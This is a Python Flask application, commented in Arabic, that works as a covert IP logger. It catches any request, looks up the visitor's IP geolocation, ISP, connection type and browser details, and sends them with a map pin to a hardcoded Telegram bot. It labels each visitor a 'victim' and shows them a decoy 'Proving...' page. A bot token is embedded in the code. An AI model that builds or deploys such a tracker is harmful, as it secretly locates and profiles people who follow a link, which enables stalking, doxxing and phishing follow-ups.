# app.py
from flask import Flask, request, Response
import requests
import json
from datetime import datetime
import os
import time

app = Flask(__name__)

# توكن البوت ومعرف الشات - يفضل تخزينهم في متغيرات بيئة على Render
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8634923674:AAFK3q-9prlbYx-jDnyvMrDIAlP8JJuc-8E")
CHAT_ID = os.environ.get("CHAT_ID", "8203901188")

# دالة الحصول على معلومات IP بالتفصيل
def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,regionName,isp,lat,lon,timezone,org,as,mobile,proxy,hosting", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    "country": data.get("country", "غير معروف"),
                    "city": data.get("city", "غير معروف"),
                    "region": data.get("regionName", "غير معروف"),
                    "isp": data.get("isp", "غير معروف"),
                    "org": data.get("org", "غير معروف"),
                    "as": data.get("as", "غير معروف"),
                    "latitude": data.get("lat", "غير معروف"),
                    "longitude": data.get("lon", "غير معروف"),
                    "timezone": data.get("timezone", "غير معروف"),
                    "mobile": data.get("mobile", False),
                    "proxy": data.get("proxy", False),
                    "hosting": data.get("hosting", False)
                }
    except:
        pass
    
    # محاولة مع موقع آخر لو فشل الأول
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            loc = data.get("loc", "0,0").split(",")
            return {
                "country": data.get("country", "غير معروف"),
                "city": data.get("city", "غير معروف"),
                "region": data.get("region", "غير معروف"),
                "isp": data.get("org", "غير معروف"),
                "org": data.get("org", "غير معروف"),
                "as": "غير معروف",
                "latitude": loc[0] if len(loc) > 0 else "غير معروف",
                "longitude": loc[1] if len(loc) > 1 else "غير معروف",
                "timezone": data.get("timezone", "غير معروف"),
                "mobile": False,
                "proxy": False,
                "hosting": False
            }
    except:
        pass
    
    return {
        "country": "غير معروف",
        "city": "غير معروف",
        "region": "غير معروف",
        "isp": "غير معروف",
        "org": "غير معروف",
        "as": "غير معروف",
        "latitude": "غير معروف",
        "longitude": "غير معروف",
        "timezone": "غير معروف",
        "mobile": False,
        "proxy": False,
        "hosting": False
    }

# دالة إرسال رسالة لتليجرام
def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"خطأ في إرسال التليجرام: {e}")

# دالة إرسال صورة للموقع
def send_location(chat_id, lat, lon):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
    data = {
        "chat_id": chat_id,
        "latitude": lat,
        "longitude": lon
    }
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'])
def catch_all(path):
    # جلب IP الزائر
    ip = request.remote_addr
    
    # لو ورا Proxy
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    elif request.headers.getlist("X-Real-IP"):
        ip = request.headers.getlist("X-Real-IP")[0]
    
    # سحب كل معلومات IP
    ip_details = get_ip_info(ip)
    
    # تحديد نوع الاتصال
    connection_type = "📱 موبايل" if ip_details['mobile'] else "💻 كمبيوتر"
    if ip_details['proxy']:
        connection_type += " (بروكسي)"
    if ip_details['hosting']:
        connection_type += " (استضافة/سيرفر)"
    
    # تجميع المعلومات الكاملة
    info = f"""
╔════════════════════════════════╗
║     🚨 ضحية جديدة دخلت 🚨      ║
╚════════════════════════════════╝

📍 <b>معلومات الـ IP:</b>
━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>العنوان:</b> <code>{ip}</code>
🏴 <b>الدولة:</b> {ip_details['country']}
🏙️ <b>المدينة:</b> {ip_details['city']}
🗺️ <b>المنطقة:</b> {ip_details['region']}
📡 <b>مزود الخدمة:</b> {ip_details['isp']}
🏢 <b>المنظمة:</b> {ip_details['org']}
🔢 <b>ASN:</b> {ip_details['as']}
🌍 <b>خط الطول:</b> {ip_details['longitude']}
🌍 <b>خط العرض:</b> {ip_details['latitude']}
⏰ <b>المنطقة الزمنية:</b> {ip_details['timezone']}
📱 <b>نوع الاتصال:</b> {connection_type}

📱 <b>معلومات الجهاز:</b>
━━━━━━━━━━━━━━━━━━━━━━
🕐 <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📂 <b>المسار:</b> <code>/{path}</code>
🔧 <b>الطريقة:</b> {request.method}
📋 <b>البروتوكول:</b> {request.scheme}
🔗 <b>الرابط:</b> {request.url}
🖥️ <b>النظام:</b> {request.headers.get('User-Agent', 'غير معروف')[:150]}

🔗 <b>روابط إضافية:</b>
━━━━━━━━━━━━━━━━━━━━━━
🗺️ <b>الخريطة:</b> https://www.google.com/maps?q={ip_details['latitude']},{ip_details['longitude']}
🔍 <b>تحقق:</b> https://whatismyipaddress.com/ip/{ip}
🌐 <b>IP Location:</b> https://www.iplocation.net/?ip={ip}

╔════════════════════════════════╗
║     تم سحب جميع المعلومات     ║
╚════════════════════════════════╝
    """
    
    # إرسال للتليجرام
    send_telegram(info)
    
    # إرسال الموقع إذا كانت الإحداثيات متوفرة
    if ip_details['latitude'] != "غير معروف" and ip_details['longitude'] != "غير معروف":
        try:
            lat = float(ip_details['latitude'])
            lon = float(ip_details['longitude'])
            send_location(CHAT_ID, lat, lon)
            send_telegram(f"📍 موقع الضحية:\n{lat}, {lon}")
        except:
            pass
    
    # إرجاع رد "Proving..." للضحية
    return "Proving...", 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/stats')
def stats():
    return {
        "status": "online",
        "message": "API شغال على Render",
        "time": datetime.now().isoformat()
    }

@app.route('/health')
def health():
    return "OK", 200

# للـ Render - هذا مهم
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 API شغال على المنفذ {port}")
    print("📡 أي ضحية تدخل، كل معلوماته تتبعت للتليجرام")
    app.run(host='0.0.0.0', port=port)